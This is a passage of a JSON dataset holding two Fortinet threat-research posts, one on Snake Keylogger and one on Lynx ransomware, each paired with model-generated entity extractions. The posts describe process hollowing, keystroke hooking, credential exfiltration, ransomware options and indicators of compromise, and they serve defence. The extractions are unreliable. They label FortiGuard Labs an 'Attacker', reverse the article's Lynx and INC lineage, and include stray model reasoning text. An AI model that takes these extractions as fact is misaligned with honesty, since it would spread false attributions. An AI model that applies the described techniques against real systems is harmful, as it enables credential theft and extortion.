Run () method, executing ageless.exe and ensuring the malware runs automatically upon system startup. The ageless.vbs script, as captured and backed up by FSAv5 for analysis, is shown in Figure 6. Snake Keylogger copies the ageless.vbs file into the Startup folder as a persistence mechanism, ensuring that it automatically executes each time the infected system reboots. This method is commonly used because the Windows Startup folder allows scripts, executables, or shortcuts to run without required administrative privileges. By leveraging this technique, Snake Keylogger can maintain access to the compromised system and re-establish a foothold even if the malicious process is terminated. Figure 7 illustrates an indicator of Snake Keylogger employing this persistence method. Additionally, Figure 8 shows a screenshot of the ageless.vbs file placed in the Startup folder. After the execution of ageless.exe, the malware injects its malicious payload into a legitimate .NET process. The observed sample targets the RegSvcs.exe process using a technique known as process hollowing, which allows the malware to execute its code within a trusted process to evade detection. Process hollowing works by first spawning RegSvcs.exe in a suspended state, preventing it from executing its legitimate code. Next, the malware deallocates the original code section and allocates new memory space within the hollowed process. Finally, it writes its malicious payload into the newly allocated space. When the process resumes, RegSvcs.exe executes the injected malicious code. This method allows the malware to conceal its presence, making it significantly harder for traditional security tools to detect and remove. By embedding itself within a trusted process, Snake Keylogger can operate undetected and continue its malicious activities. Figure 9 shows an indicator with its corresponding risk score, highlighting the severity of the threat. Another FSAv5 indicator that provides valuable insights into the malware’s capabilities is its ability to detect when the folder storing browser-related login credentials and other sensitive data is accessed, as shown in Figure 10. This indicator offers critical clues about the malware’s intent and behavior, highlighting its potential to compromise user data. Snake Keylogger leverages various techniques to exfiltrate stolen credentials and gather additional information about the victim. One such method involves using websites like hxxp://checkip[.]dyndns[.]org to retrieve the victim’s geolocation, further enhancing its reconnaissance capabilities. Additionally, Snake Keylogger uploads stolen credentials through several channels, including SMTP and Telegram bots, using HTTP Post requests to securely transmit the data to its command-and-control server, as shown in Figure 11. The FortiSandbox research team analyzed the malware through reverse engineering and dynamic sandbox analysis, revealing the full scope of its malicious capabilities. Figures 12 and 13 show that the malware employs specialized modules to steal sensitive data from browser autofill systems, including credit card details. To capture keystrokes, it leverages the SetWindowsHookEx API with the first parameter set to WH_KEYBOARD_LL (flag 13), a low-level keyboard hook that monitors keystrokes (see Figure 14). This technique allows the malware to log sensitive input such as banking credentials. FortiSandbox plays a pivotal role in detecting and analyzing advanced malware threats like Snake Keylogger. Leveraging its innovative static and dynamic analysis capabilities and the power of its PAIX engine, FortiSandbox ensures the comprehensive detection of sophisticated threats. Capturing detailed indicators of compromise also empowers users to proactively safeguard their systems against evolving malware attacks, providing valuable insights for effective mitigation. TheFortiSandboxidentifies the malware mentioned in this report and any variations of it. It does not rely on updates fromFortiGuard Antivirus; instead, it utilizes the PAIX engine’s Machine Learning technology to detect previously unknown threats. FortiGuard Antivirus specifically detects the malware described in this report as AutoIt/Injector.GTY!tr. This service is integrated into FortiGate, FortiMail, FortiClient, and FortiEDR solutions, providing protection to customers using these products with up-to-date defenses. Additionally, the FortiGuard Web Filtering Service detects and blocks the command-and-control (C2) server. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization. Please contact ourGlobal FortiGuard Incident Response Team. Command-and-Control (C2) Serverhttp://51[.]38[.]247[.]67:8081/_send_php?L [Original file]f8410bcd14256d6d355d7076a78c074f [ageless.exe]f8410bcd14256d6d355d7076a78c074f [ageless.vbs]77f8db41b320c0ba463c1b9b259cfd1b keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Attacker), (Microsoft Windows, Platform), (AutoIt/Injector.GTY!tr, Malware), (Snake Keylogger, Malware), (404 Keylogger, Malware), (FortiSandbox v5.0 (FSAv5), Tool), (FortiGuard Labs, Threat Type), (China, Country), (Turkey, Country), (Indonesia, Country), (Taiwan, Country), (Spain, Country), (SMTP, Technique), (Telegram bots, Tool), (Chrome, Browser), (Edge, Browser), (Firefox, Browser), (C2 server, Tool), (2025 Global Thr, Threat Type)\nRelationships: (FortiGuard Labs, leverages, FortiSandbox v5.0 (FSAv5)), (FortiGuard Labs, detects, AutoIt/Injector.GTY!tr), (FortiGuard Labs, detects, Snake Keylogger), (FortiGuard Labs, detects, 404 Keylogger), (AutoIt/Injector.GTY!tr, is aka, Snake Keylogger), (AutoIt/Injector.GTY!tr, is aka, 404 Keylogger), (AutoIt/Injector.GTY!tr, target, China), (AutoIt/Injector.GTY!tr, target, Turkey), (AutoIt/Injector.GTY!tr, target, Indonesia), (AutoIt/",
      "entities": [
        [
          "FortiGuard Labs",
          "Attacker"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "Malware"
        ],
        [
          "Snake Keylogger",
          "Malware"
        ],
        [
          "404 Keylogger",
          "Malware"
        ],
        [
          "FortiGuard Labs",
          "Threat Type"
        ],
        [
          "China",
          "Country"
        ],
        [
          "Turkey",
          "Country"
        ],
        [
          "Indonesia",
          "Country"
        ],
        [
          "Taiwan",
          "Country"
        ],
        [
          "Spain",
          "Country"
        ],
        [
          "SMTP",
          "Technique"
        ],
        [
          "Telegram bots",
          "Tool"
        ],
        [
          "Chrome",
          "Browser"
        ],
        [
          "Edge",
          "Browser"
        ],
        [
          "Firefox",
          "Browser"
        ],
        [
          "C2 server",
          "Tool"
        ],
        [
          "2025 Global Thr",
          "Threat Type"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "leverages",
          "FortiSandbox v5.0 (FSAv5"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "AutoIt/Injector.GTY!tr"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "Snake Keylogger"
        ],
        [
          "FortiGuard Labs",
          "detects",
          "404 Keylogger"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "is aka",
          "Snake Keylogger"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "is aka",
          "404 Keylogger"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "target",
          "China"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "target",
          "Turkey"
        ],
        [
          "AutoIt/Injector.GTY!tr",
          "target",
          "Indonesia"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 9,
    "model": "Qwen3 4B",
    "index": 28
  },
  {
    "title": "Ransomware Roundup – Lynx",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-lynx",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Lynx ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the Lynx ransomware was made available on a publicly available file-scanning site in early July 2024, which coincides with other reports of its first availability. Our research found that the Lynx and INC ransomware, which first appeared in July 2023, look very similar. However, INC offers fewer options at the execution phase. We believe that INC ransomware is a predecessor to the Lynx ransomware. While INC ransomware is available for the Windows and ESXi platforms, we have not found a Lynx variant of the ransomware that affects non-Windows environments. The screenshot above shows the different options and functions an INC ransomware sample can perform. In contrast, the screenshot below shows what they are for a LYNX sample. LYNX ransomware offers more granular control than INC. Like most ransomware, INC and LYNX encrypt files on victims' Windows machines. Both families use the same encryption methods. Furthermore, both families modify the desktop background to display the ransom note. At the same time, both try to send the ransom note to connected printers. These can be seen in the following screenshots. Like other ransomware attacks, these demand a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the Lynx ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the Lynx ransomware takes the following line arguments: Option Description --file <filePath> Encrypt only specified file(s) --dir <dirPath> Encrypt only specified directory/directories --mode fast Encrypt 5% from entire file --mode medium Encrypt 15% from entire file (default) --mode slow Encrypt 25% from entire file --mode entire Encrypt 100% from entire file --help Print this message --verbose Enable verbosity --silent Enable silent encryption (no extension and notes will be added) --stop-processes Try to stop processes via RestartManager --encrypt-network Encrypt network shares --load-drives Load hidden drives (will corrupt boot loader) --hide-cmd Hide console window --no-background Don't change background image --no-print Don't print note on printers --kill Kill processes/services --safe-mode Enter safe-mode The Lynx ransomware always kills processes containing the following strings to maximize damage: It kills services that contain the following strings: The Lynx ransomware then encrypts files on the compromised machines and adds a file extension “.LYNX” to the affected files. The ransomware avoids encrypting files in the following folders: The Lynx ransomware avoids encrypting files with the following extensions: It also performs the following actions: The Lynx ransomware drops the following ransom note in “README.txt”: The ransomware then replaces the desktop wallpaper with the same ransom message. The oldest Lynx ransomware sample (SHA2: eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc) displays a slightly different ransom note. It contains different TOR sites and an attacker email address not found in other Lynx ransomware. The ransom note directs victims to a chat site operated by the attacker on TOR, where victims must first register with a unique ID. The Lynx ransomware has a data leak site that posts victim information, including data stolen from victims. As of this writing (January 29, 2025), the data leak site lists 96 victims, with the latest publication date being January 20, 2025. Our investigation found the following about the Lynx ransomware victims listed on the data leak site: Note that victims who paid the ransom may have been removed from the data leak site, and as such, additional companies may be affected by the Lynx ransomware. Separate from the aforementioned chat site, the Lynx ransomware group operates a data leak site on TOR. The Lynx ransomware group claims they have a policy to exclude “governmental institutions, hospitals, or non-profit organizations as these sectors play vital roles in society.” However, some victims listed on the data leak site are organizations believed to be in the healthcare and energy sectors. As with other ransomware groups, each victim has its own data leak page with a description of the stolen documents, the revenue of the victim organization, and the date the data was leaked. The Lynx ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Lynx Ransomware File IOCs SHA2 Note 31de5a766dca4eaae7b69f807ec06ae14d2ac48100e06a30e17cc9acccfd5193 Lynx ransomware 3e68e5742f998c5ba34c2130b2d89ca2a6c048feb6474bc81ff000e1eaed044e 432f549e9a2a76237133e9fe9b11fbb3d1a7e09904db5ccace29918e948529c6 468e3c2cb5b0bbc3004bbf5272f4ece5c979625f7623e6d71af5dc0929b89d6a 4e5b9ab271a1409be300e5f3fd90f934f317116f30b40eddc82a4dfd18366412 571f5de9dd0d509ed7e5242b9b7473c2b2cbb36ba64d38b32122a0a337d6cf8b 589ff3a5741336fa7c98dbcef4e8aecea347ea0f349b9949c6a5f6cd9d821a23 80908a51e403efd47b1d3689c3fb9447d3fb962d691d856b8b97581eefc0c441 85699c7180ad77f2ede0b15862bb7b51ad9df0478ed394866ac7fa9362bf5683 97c8f54d70e300c7d7e973c4b211da3c64c0f1c95770f663e04e35421dfb2ba0 9a47ab27d50df1faba1dc5777bdcfff576524424bc4a3364d33267bbcf8a3896 b378b7ef0f906358eec595777a50f9bb5cc7bb6635e0f031d65b818a26bdc4ee d5ca3e0e25d768769e4afda209aca1f563768dae79571a38e3070428f8adf031 eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc ecbfea3e7869166dd418f15387bc33ce46f2c72168f571071916b5054d7f6e49 f71fc818362b1465fc1deb361de36badc73ac4dd9e815153c9022f82c4062787 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Ransomware Roundup, Threat Type), (Lynx ransomware, Malware), (Microsoft Windows, Platform), (Ransomware, Threat Type), (INC ransomware, Malware), (FortiGuard Labs, Organization), (2025 Global Threat Landscape Report, Document), (Fortinet solutions, Tool), (Windows and ESXi platforms, Platform), (2024, Time), (2023, Time)\nRelationships: (Ransomware Roundup, is part of, 2025 Global Threat Landscape Report), (Lynx ransomware, is a variant of, Ransomware), (Lynx ransomware, is associated with, Microsoft Windows), (INC ransomware, is a variant of, Ransomware), (INC ransomware, is associated with, Windows and ESXi platforms), (Lynx ransomware, is a predecessor of, INC ransomware), (FortiGuard Labs, produces, Ransomware Roundup), (FortiGuard Labs, produces, 2025 Global Threat Landscape Report), (FortiGuard Labs, provides, Fortinet solutions), (FortiGuard Labs, is associated with, 2024), (FortiGuard Labs, is associated with, 2023)\nOkay, let's tackle this. The input is about FortiGuard Labs and their report on ransomware variants, specifically Lynx and",
      "entities": [
        [
          "Ransomware Roundup",
          "Threat Type"
        ],
        [
          "Lynx ransomware",
          "Malware"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Ransomware",
          "Threat Type"
        ],
        [
          "INC ransomware",
          "Malware"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "Fortinet solutions",
          "Tool"
        ],
        [
          "Windows and ESXi platforms",
          "Platform"
        ],
        [
          "2024",
          "Time"
        ],
        [
          "2023",
          "Time"
        ]
      ],
      "relationships": [
        [
          "Ransomware Roundup",
          "is part of",
          "2025 Global Threat Landscape Report"
        ],
        [
          "Lynx ransomware",
          "is a variant of",
          "Ransomware"
        ],
        [
          "Lynx ransomware",
          "is associated with",
          "Microsoft Windows"
        ],
        [
          "INC ransomware",
          "is a variant of",
          "Ransomware"
        ],
        [
          "INC ransomware",
          "is associated with",
          "Windows and ESXi platforms"
        ],
        [
          "Lynx ransomware",
          "is a predecessor of",
          "INC ransomware"
        ],
        [
          "FortiGuard Labs",
          "produces",
          "Ransomware Roundup"
        ],
        [
          "FortiGuard Labs",
          "produces",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "Fortinet solutions"
        ],
        [
          "FortiGuard Labs",
          "is associated with",
          "2024"
        ],
        [
          "FortiGuard Labs",
          "is associated with",
          "2023"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 11,
    "model": "Qwen3 4B",
    "index": 29
  }
]